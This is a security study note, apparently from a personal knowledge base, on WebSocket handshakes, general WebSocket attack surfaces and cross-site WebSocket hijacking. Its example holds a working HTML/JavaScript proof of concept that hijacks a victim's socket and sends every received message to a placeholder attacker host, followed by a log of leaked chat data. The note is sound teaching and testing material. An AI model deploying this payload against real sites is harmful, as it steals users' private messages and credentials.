>[!question] What are WebSockets?
>WebSockets are a bi-directional, full duplex communications protocol initiated over HTTP. They are commonly used in modern web applications for streaming data and other asynchronous traffic.

# WebSockets 101

WebSocket connections are initiated over HTTP and are typically long-lived. Messages can be sent in either direction at any time and are not transactional in nature. The connection will normally stay open and idle until either the client or the server is ready to send a message.

WebSockets are particularly useful in situations where low-latency or server-initiated messages are required, such as real-time feeds of financial data.

>[!tip] Tooling for testing WebSockets
>- [SocketSleuth](https://github.com/snyk/socketsleuth/) [^note]

[^note]:[Start free - SocketSleuth Improving Security Testing for WebSocket Applications  Snyk](../../Readwise/Articles/Start%20free%20-%20SocketSleuth%20Improving%20Security%20Testing%20for%20WebSocket%20Applications%20%20Snyk.md#^af3f13)
## Establishing connections

Protocols to open WebSocket:
- `wss://normal-website.com/chat`: WebSocket over TLS
- `ws://normal-website.com/chat`: clear-text WebSocket

To establish the connection, the browser and server perform a WebSocket handshake over HTTP:

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

If the server accepts the connection, it returns a WebSocket handshake response like the following:

```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

At this point, the network connection remains open and can be used to send WebSocket messages in either direction.

>[!note]
>WebSocket messages can contain any content or data format, although in modern web application the JSON format is the most used 

# General attacks

In principle, practically any web security vulnerability might arise in relation to WebSockets:

- User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as [SQL Injection](SQL%20Injection.md) or [XML External Entity Injection (XXE Injection)](XML%20External%20Entity%20Injection%20(XXE%20Injection).md)
- Some blind vulnerabilities reached via WebSockets might only be detectable using [out-of-band (OAST) techniques](https://portswigger.net/blog/oast-out-of-band-application-security-testing).
- If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to [Cross-Site Scripting (XSS)](Cross-Site%20Scripting%20(XSS).md) or other [Client side vulnerabilities](../Services/HTTP%20&%20HTTPS.md#Client%20side%20vulnerabilities)
- Manipulating the WebSocket handshake to exploit vulnerabilities
- Using cross-site WebSockets hijacking (CSWSH)

## Cross-site WebSockets hijacking (CSWSH)

 Cross-site WebSockets hijacking is a [Cross-Site Request Forgery (CSRF)](Cross-Site%20Request%20Forgery%20(CSRF).md) vulnerability on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values. 
 
 Unlike regular CSRF, the attacker gains **two-way interaction** with the compromised application. What happens next in the attack depends entirely on the application's logic and how it is using [WebSockets](https://portswigger.net/web-security/websockets). The attack might involve: 
- Sending WebSocket messages to perform unauthorized actions on behalf of the victim user.
- Sending WebSocket messages to retrieve sensitive data.
- Sometimes, just waiting for incoming messages to arrive containing sensitive data.


>[!example]
>PoC hosted on the attacker server performing the CSRF and leaking the received information using ws:
>
>```html
><script>
>    var ws = new WebSocket('wss://your-websocket-url');
>    ws.onopen = function() {
>        ws.send("READY");
>    };
>    ws.onmessage = function(event) {
>        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
>    };
></script>
>```
>Data exfiltrated from the victim ws:
>```http
>...
10.0.4.85       2023-01-06 21:24:17 +0000 "GET /exploit/ HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
10.0.4.85       2023-01-06 21:24:18 +0000 "GET /log?a={%22user%22:%22Hal%20Pline%22,%22content%22:%22Hello,%20how%20can%20I%20help?%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
10.0.4.85       2023-01-06 21:24:18 +0000 "GET /log?a={%22user%22:%22You%22,%22content%22:%22I%20forgot%20my%20password%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
10.0.4.85       2023-01-06 21:24:18 +0000 "GET /log?a={%22user%22:%22CONNECTED%22,%22content%22:%22--%20Now%20chatting%20with%20Hal%20Pline%20--%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
10.0.4.85       2023-01-06 21:24:18 +0000 "GET /log?a={%22user%22:%22You%22,%22content%22:%22Thanks,%20I%20hope%20this%20doesn&apos;t%20come%20back%20to%20bite%20me!%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
10.0.4.85       2023-01-06 21:24:18 +0000 "GET /log?a={%22user%22:%22Hal%20Pline%22,%22content%22:%22No%20problem%20carlos,%20it&apos;s%20qhakj7ncjna6l17u20as%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
|...
>```

This vulnerability was used against Gitpod to leak environment data and obtain SSH keys, bypassing [SameSite attribute on cookies](Session%20Attacks%20and%20Session%20Prediction.md#SameSite%20attribute%20on%20cookies), finally escalating to RCE. [^gitpod]
The same vulnerability was also used to get RCE against MeshCentral [^meshcentral-cswsh]

[^gitpod]: [Gitpod remote code execution 0-day vulnerability via WebSockets](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/), snyk.io
[^meshcentral-cswsh]: [MeshCentral Cross-Site Websocket Hijacking Vulnerability (CVE-2024-26135)](https://www.praetorian.com/blog/meshcentral-cross-site-websocket-hijacking-vulnerability/), praetorian.com